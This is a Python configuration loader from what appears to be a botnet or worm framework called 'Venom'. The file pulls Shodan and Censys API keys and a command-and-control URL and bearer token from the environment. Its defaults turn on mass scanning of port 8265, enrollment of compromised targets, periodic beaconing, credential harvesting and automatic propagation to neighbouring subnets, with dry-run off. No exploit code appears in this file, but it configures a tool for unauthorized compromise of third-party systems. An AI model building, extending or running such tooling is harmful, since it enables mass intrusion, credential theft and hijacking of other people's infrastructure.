import json
import os
from pathlib import Path
from typing import Any, Dict

DEFAULT_CONFIG_PATH = Path(__file__).resolve().parent.parent / "config.json"


def load_config(path: str = None) -> Dict[str, Any]:
    """Load config.json, overlay environment variables, return merged dict."""
    cfg_path = Path(path) if path else DEFAULT_CONFIG_PATH
    cfg = {}
    if cfg_path.exists():
        cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
    # env overrides
    if os.environ.get("SHODAN_API_KEY"):
        cfg["shodan_api_key"] = os.environ["SHODAN_API_KEY"]
    if os.environ.get("CENSYS_ID"):
        cfg["censys_id"] = os.environ["CENSYS_ID"]
    if os.environ.get("CENSYS_SECRET"):
        cfg["censys_secret"] = os.environ["CENSYS_SECRET"]
    if os.environ.get("VENOM_C2_URL"):
        cfg["c2_url"] = os.environ["VENOM_C2_URL"]
    # defaults
    defaults = {
        "c2_url": "http://127.0.0.1:8000",
        "c2_bearer": "CHANGE_ME_VENOM_C2_KEY",
        "max_targets": 100,
        "scan_ports": [8265],
        "scan_threads": 600,
        "enroll_concurrency": 20,
        "job_timeout": 60,
        "beacon_interval": 60,
        "max_work_cycles": 1000,
        "harvest_credentials": True,
        "propagate": True,
        "propagate_cidrs": ["auto24"],
        "dry_run": False,
    }
    for k, v in defaults.items():
        cfg.setdefault(k, v)
    return cfg